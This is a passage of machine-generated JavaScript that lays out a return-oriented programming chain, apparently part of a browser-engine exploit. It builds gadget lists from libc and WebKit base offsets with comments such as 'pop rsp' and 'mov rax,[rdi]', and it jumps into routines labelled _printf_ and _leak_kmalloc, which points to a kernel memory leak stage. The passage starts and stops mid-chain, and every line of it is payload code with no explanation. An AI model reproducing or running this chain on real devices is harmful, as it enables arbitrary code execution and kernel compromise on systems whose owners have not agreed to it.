libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+315848,//L5770
//L5803:
libc_base+713278,
ropchain+320408,//L5886
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5884:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L5886:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+320496,//L5888
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+320512,//L5889
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5888:
db([0,0]);
set_gadget(libc_base+772328,);
//L5889:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+320656,//L5892
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+320624,//L5890
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+320640,//L5891
webkit_base+4687784,
libc_base+165442
]);
//L5890:
db([0,0]);
set_gadget(libc_base+772328,);
//L5891:
db([0,0]);
set_gadget(libc_base+768796,);
//L5892:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+320728,//L5894
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5894:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+320784,//L5896
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5896:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+320880,//L5898
webkit_base+4687784,
libc_base+768796
]);
//L5897:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5898:
db([0,0]);
set_gadget(libc_base+772328,);
//L5899:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+320976,//L5900
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+320992,//L5901
webkit_base+4687784,
libc_base+772328
]);
//L5900:
db([0,0]);
set_gadget(libc_base+768796,);
//L5901:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+321080,//L5903
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5903:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+321136,//L5905
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5905:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+321264,//L5906
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+321296,//L5908
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+321280,//L5907
webkit_base+4687784,
libc_base+165442
]);
//L5906:
db([0,0]);
set_gadget(libc_base+772328,);
//L5907:
db([0,0]);
set_gadget(libc_base+768796,);
//L5908:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+321440,//L5911
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+321408,//L5909
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+321424,//L5910
webkit_base+4687784,
libc_base+165442
]);
//L5909:
db([0,0]);
set_gadget(libc_base+772328,);
//L5910:
db([0,0]);
set_gadget(libc_base+768796,);
//L5911:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5913:
ropchain+603872,//L5912
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L5915:
ropchain+321592,//L5914
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+161664,//_printf_
//L5914:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5916:
db([4294965200,4294967295]);// -0x830
set_gadget(libc_base+772328,);
//L5918:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+321720,//L5920
webkit_base+4687784,
libc_base+772328
]);
//L5919:
db([0,0]);
set_gadget(libc_base+768796,);
//L5920:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+321776,//L5923
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5923:
db([0,0]);
//L5921:
set_gadgets([
libc_base+713278,
ropchain+321840,//L5926
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5924:
db([4294965200,4294967295]);// -0x830
set_gadget(libc_base+772328,);
//L5926:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+321928,//L5928
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+321944,//L5929
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5928:
db([0,0]);
set_gadget(libc_base+772328,);
//L5929:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+322104,//L5931
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+322136,//L5933
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+322088,//L5930
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+322120,//L5932
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5930:
db([0,0]);
set_gadget(libc_base+165442,);
//L5931:
db([0,0]);
set_gadget(libc_base+772328,);
//L5932:
db([0,0]);
set_gadget(libc_base+768796,);
//L5933:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+322216,//L5934
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+322232,//L5935
webkit_base+4687784,
libc_base+165442
]);
//L5934:
db([0,0]);
set_gadget(libc_base+768796,);
//L5935:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+322328,//L5937
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+322312,//L5936
webkit_base+4687784,
libc_base+165442
]);
//L5936:
db([0,0]);
set_gadget(libc_base+768796,);
//L5937:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+322424,//L5939
webkit_base+4687784,
libc_base+768796
]);
//L5938:
db([512,0]);// 0x200
set_gadget(webkit_base+3789839,);//pop r11
//L5939:
db([0,0]);
set_gadget(libc_base+165442,);
//L5940:
db([512,0]);// 0x200
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+322568,//L5942
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+322584,//L5943
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+322552,//L5941
webkit_base+4687784,
libc_base+165442
]);
//L5941:
db([0,0]);
set_gadget(libc_base+772328,);
//L5942:
db([0,0]);
set_gadget(libc_base+768796,);
//L5943:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+322760,//L5945
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+322776,//L5946
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+322744,//L5944
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5944:
db([0,0]);
set_gadget(libc_base+165442,);
//L5945:
db([0,0]);
set_gadget(libc_base+768796,);
//L5946:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+322904,//L5949
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+322936,//L5951
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+322920,//L5950
webkit_base+4687784,
libc_base+713278
]);
//L5948:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L5949:
db([0,0]);
set_gadget(libc_base+165442,);
//L5950:
db([0,0]);
set_gadget(libc_base+768796,);
//L5951:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+323048,//L5952+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+323040,//L5952
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L5952:
db([0,0]);
set_gadgets([
ropchain+323064,//L5952+24
ropchain+323080,//L5947
libc_base+489696,//pop rsp
ropchain+323096,//L5953
//L5947:
libc_base+489696,//pop rsp
ropchain+326184,//L5954
//L5953:
libc_base+768796
]);
//L5955:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5956:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5957:
db([25,0]);// 0x19
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L5958:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+323344,//L5961
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5959:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L5961:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+323432,//L5963
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+323448,//L5964
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5963:
db([0,0]);
set_gadget(libc_base+772328,);
//L5964:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+323592,//L5967
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+323608,//L5968
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+323576,//L5966
webkit_base+4687784,
libc_base+713278
]);
//L5965:
db([24,0]);// 0x18
set_gadget(libc_base+165442,);
//L5966:
db([0,0]);
set_gadget(libc_base+772328,);
//L5967:
db([0,0]);
set_gadget(libc_base+768796,);
//L5968:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+323696,//L5970
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+323712,//L5971
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5970:
db([0,0]);
set_gadget(libc_base+772328,);
//L5971:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+323856,//L5974
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+323824,//L5972
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+323840,//L5973
webkit_base+4687784,
libc_base+165442
]);
//L5972:
db([0,0]);
set_gadget(libc_base+772328,);
//L5973:
db([0,0]);
set_gadget(libc_base+768796,);
//L5974:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+323928,//L5976
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5976:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+323984,//L5978
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5978:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+324080,//L5981
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L5979:
db([4294965200,4294967295]);// -0x830
set_gadget(libc_base+772328,);
//L5981:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+324168,//L5983
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+324184,//L5984
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L5983:
db([0,0]);
set_gadget(libc_base+772328,);
//L5984:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+324344,//L5986
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+324376,//L5988
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+324328,//L5985
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+324360,//L5987
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5985:
db([0,0]);
set_gadget(libc_base+165442,);
//L5986:
db([0,0]);
set_gadget(libc_base+772328,);
//L5987:
db([0,0]);
set_gadget(libc_base+768796,);
//L5988:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+324536,//L5992
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+324488,//L5989
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+324504,//L5990
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L5989:
db([0,0]);
set_gadget(libc_base+165442,);
//L5990:
db([0,0]);
set_gadget(libc_base+772328,);
//L5991:
db([4,0]);// 0x4
set_gadget(libc_base+768796,);
//L5992:
db([0,0]);
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+324616,//L5993
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+324632,//L5994
webkit_base+4687784,
libc_base+772328
]);
//L5993:
db([0,0]);
set_gadget(libc_base+768796,);
//L5994:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+324720,//L5996
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5996:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+324776,//L5998
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L5998:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+324904,//L5999
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+324936,//L6001
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+324920,//L6000
webkit_base+4687784,
libc_base+165442
]);
//L5999:
db([0,0]);
set_gadget(libc_base+772328,);
//L6000:
db([0,0]);
set_gadget(libc_base+768796,);
//L6001:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+325096,//L6003
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+325128,//L6005
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+325080,//L6002
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+325112,//L6004
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6002:
db([0,0]);
set_gadget(libc_base+165442,);
//L6003:
db([0,0]);
set_gadget(libc_base+772328,);
//L6004:
db([0,0]);
set_gadget(libc_base+768796,);
//L6005:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+325208,//L6006
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+325224,//L6007
webkit_base+4687784,
libc_base+165442
]);
//L6006:
db([0,0]);
set_gadget(libc_base+768796,);
//L6007:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+325320,//L6009
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+325304,//L6008
webkit_base+4687784,
libc_base+165442
]);
//L6008:
db([0,0]);
set_gadget(libc_base+768796,);
//L6009:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6011:
ropchain+325424,//L6010
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+336600,//L5744
//L6010:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
//L6012:
libc_base+713278,
ropchain+325512,//L6015
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6013:
db([4294965200,4294967295]);// -0x830
set_gadget(libc_base+772328,);
//L6015:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+325600,//L6017
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+325616,//L6018
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6017:
db([0,0]);
set_gadget(libc_base+772328,);
//L6018:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+325776,//L6020
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+325808,//L6022
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+325760,//L6019
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+325792,//L6021
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6019:
db([0,0]);
set_gadget(libc_base+165442,);
//L6020:
db([0,0]);
set_gadget(libc_base+772328,);
//L6021:
db([0,0]);
set_gadget(libc_base+768796,);
//L6022:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+325904,//L6024
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+325888,//L6023
webkit_base+4687784,
libc_base+165442
]);
//L6023:
db([0,0]);
set_gadget(libc_base+768796,);
//L6024:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+325992,//L6026
webkit_base+4687784,
libc_base+713278
]);
//L6025:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L6026:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+326064,//L6029
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6027:
db([4294965200,4294967295]);// -0x830
set_gadget(libc_base+772328,);
//L6029:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+326128,//L6031
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6031:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+321784,//L5921
//L5954:
libc_base+768796
]);
//L6032:
db([256,0]);// 0x100
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+326288,//L6034
webkit_base+4687784,
libc_base+713278
]);
//L6033:
db([4294965248,4294967295]);// -0x800
set_gadget(libc_base+768796,);
//L6034:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+326392,//L6037
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6035:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6037:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+326480,//L6039
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+326496,//L6040
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6039:
db([0,0]);
set_gadget(libc_base+772328,);
//L6040:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+326656,//L6042
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+326688,//L6044
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+326640,//L6041
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+326672,//L6043
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6041:
db([0,0]);
set_gadget(libc_base+165442,);
//L6042:
db([0,0]);
set_gadget(libc_base+772328,);
//L6043:
db([0,0]);
set_gadget(libc_base+768796,);
//L6044:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+326784,//L6046
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+326768,//L6045
webkit_base+4687784,
libc_base+165442
]);
//L6045:
db([0,0]);
set_gadget(libc_base+768796,);
//L6046:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+326880,//L6049
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6047:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6049:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+326968,//L6051
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+326984,//L6052
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6051:
db([0,0]);
set_gadget(libc_base+772328,);
//L6052:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+327128,//L6055
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+327144,//L6056
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+327112,//L6054
webkit_base+4687784,
libc_base+713278
]);
//L6053:
db([16,0]);// 0x10
set_gadget(libc_base+165442,);
//L6054:
db([0,0]);
set_gadget(libc_base+772328,);
//L6055:
db([0,0]);
set_gadget(libc_base+768796,);
//L6056:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+327232,//L6058
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+327248,//L6059
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6058:
db([0,0]);
set_gadget(libc_base+772328,);
//L6059:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+327408,//L6061
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+327440,//L6063
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+327392,//L6060
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+327424,//L6062
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6060:
db([0,0]);
set_gadget(libc_base+165442,);
//L6061:
db([0,0]);
set_gadget(libc_base+772328,);
//L6062:
db([0,0]);
set_gadget(libc_base+768796,);
//L6063:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+327536,//L6065
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+327520,//L6064
webkit_base+4687784,
libc_base+165442
]);
//L6064:
db([0,0]);
set_gadget(libc_base+768796,);
//L6065:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6067:
ropchain+327640,//L6066
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+298576,//_leak_kmalloc
//L6066:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+327760,//L6070
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6068:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L6070:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+327848,//L6072
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+327864,//L6073
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6072:
db([0,0]);
set_gadget(libc_base+772328,);
//L6073:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+328008,//L6076
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+327976,//L6074
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+327992,//L6075
webkit_base+4687784,
libc_base+165442
]);
//L6074:
db([0,0]);
set_gadget(libc_base+772328,);
//L6075:
db([0,0]);
set_gadget(libc_base+768796,);
//L6076:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+328080,//L6078
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6078:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+328136,//L6080
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6080:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+328232,//L6082
webkit_base+4687784,
libc_base+768796
]);
//L6081:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L6082:
db([0,0]);
set_gadget(libc_base+772328,);
//L6083:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+328328,//L6084
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+328344,//L6085
webkit_base+4687784,
libc_base+772328
]);
//L6084:
db([0,0]);
set_gadget(libc_base+768796,);
//L6085:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+328432,//L6087
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6087:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+328488,//L6089
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6089:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+328560,//L6091
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6091:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+328616,//L6093
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6093:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L6094:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6095:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6096:
db([51,0]);// 0x33
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
